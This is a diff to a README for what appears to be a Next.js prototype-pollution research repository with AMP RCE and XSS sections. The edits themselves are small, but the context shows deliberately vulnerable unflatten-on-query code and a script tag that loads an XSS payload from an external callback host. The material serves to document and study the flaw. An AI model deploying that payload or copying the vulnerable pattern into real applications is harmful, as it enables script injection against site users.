@@ -21,7 +21,7 @@ npm start
 
 ## Vulnerability
 
-[pages/vulnerable.js](./pages/vulnerable.js)
+[pages/vulnerable.js](./pages/vulnerable.js#L25)
 
 ```js
 const out = unflatten({ ...context.query });
@@ -42,7 +42,6 @@ const out = unflatten({ ...context.query });
 | Image & Font Optimization     |                                                    |                               |                                 |           |
 | API & Middlewares             |                                                    |                               |                                 |           |
 | Router                        |                                                    |                               |                                 |           |
-| Prisma                        |                                                    |                               |                                 |           |
 
 ## AMP RCE
 
@@ -239,7 +238,7 @@ async transformHtml(t, e) {
 // <script async="" src="https://xss-callback.pwnfunction.repl.co/v0.js"></script>
 ```
 
-> ➕ Also while initializing runtime styles in `@ampproject/toolbox-optimizer`, response body from `ampUrlPrefix` is inserted directly into the ssr-page, meaning one can still achieve XSS even if `RewriteAmpUrls` transformer is disabled.
+> Also while initializing runtime styles in `@ampproject/toolbox-optimizer`, response body from `ampUrlPrefix` is inserted directly into the ssr-page, meaning one can still achieve XSS even if `RewriteAmpUrls` transformer is disabled.
 
 ## Redirect SSR
 
